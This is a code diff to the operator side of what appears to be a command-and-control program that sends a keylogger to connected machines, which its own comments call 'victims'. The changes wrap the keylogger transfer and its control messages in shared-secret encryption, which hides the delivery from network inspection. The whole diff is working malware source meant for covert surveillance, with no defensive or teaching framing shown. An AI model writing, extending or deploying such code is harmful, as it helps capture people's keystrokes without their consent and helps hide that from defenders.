@@ -245,28 +245,28 @@ def disconnect_from_client(sockets_list: list, connected_clients: dict):
     print(constants.MENU_CLOSING_BANNER)
 
 
-def transfer_keylog_program(sock: socket.socket, dest_ip: str, dest_port: int):
+def transfer_keylog_program(sock: socket.socket, dest_ip: str,
+                            dest_port: int, shared_secret: bytes):
     # Send the notification to the victim that a file transfer is about to occur
-    sock.send(constants.TRANSFER_KEYLOG_MSG.encode())
-    ack = sock.recv(constants.BYTE_LIMIT).decode()
+    sock.send(encrypt_string(constants.TRANSFER_KEYLOG_MSG, shared_secret).encode())
+    ack = decrypt_string(sock.recv(constants.BYTE_LIMIT).decode(), shared_secret)
 
     # Open and Read the file to be sent
     if ack == constants.RECEIVED_CONFIRMATION_MSG:
         # Send file name
-        sock.send(constants.KEYLOG_FILE_NAME.encode())
+        sock.send(encrypt_string(constants.KEYLOG_FILE_NAME, shared_secret).encode())
         print(constants.FILE_NAME_TRANSFER_MSG.format(constants.KEYLOG_FILE_NAME))
 
         # Wait for client/victim to buffer
         time.sleep(1)
 
-        with open(constants.KEYLOG_FILE_NAME, 'rb') as file:
-            while True:
-                file_data = file.read(constants.BYTE_LIMIT)
-                if not file_data:
-                    break
-                sock.send(file_data)
+        # Encrypt File
+        encrypted_file = encrypt_file(constants.KEYLOG_FILE_NAME, shared_secret)
 
-        # Send end-of-file marker
+        # Send encrypted file data
+        sock.sendall(encrypted_file)
+
+        # Send EOF
         sock.send(constants.END_OF_FILE_SIGNAL)
 
         # Get an ACK from victim for success
@@ -4144,7 +4144,7 @@ def find_specific_client_socket(client_dict: dict,
         return None, None, None, None, None
 
 
-def perform_menu_item_3(client_dict: dict):
+def perform_menu_item_3(client_dict: dict, shared_secret: bytes):
     # CASE 1: Check if client list is empty
     if len(client_dict) == constants.ZERO:
         print(constants.FILE_TRANSFER_NO_CONNECTED_CLIENTS_ERROR)
@@ -4165,7 +4165,7 @@ def perform_menu_item_3(client_dict: dict):
             print(constants.MENU_CLOSING_BANNER)
             return None
 
-        transfer_keylog_program(client_socket, client_ip, client_port)
+        transfer_keylog_program(client_socket, client_ip, client_port, shared_secret)
 
     # CASE 3: Send keylogger to any specific connected victim
     elif len(client_dict) != constants.ZERO:
@@ -4188,7 +4188,7 @@ def perform_menu_item_3(client_dict: dict):
             return None
 
         if target_socket:
-            transfer_keylog_program(target_socket, target_ip, target_port)
+            transfer_keylog_program(target_socket, target_ip, target_port, shared_secret)
         else:
             print(constants.TARGET_VICTIM_NOT_FOUND)
 
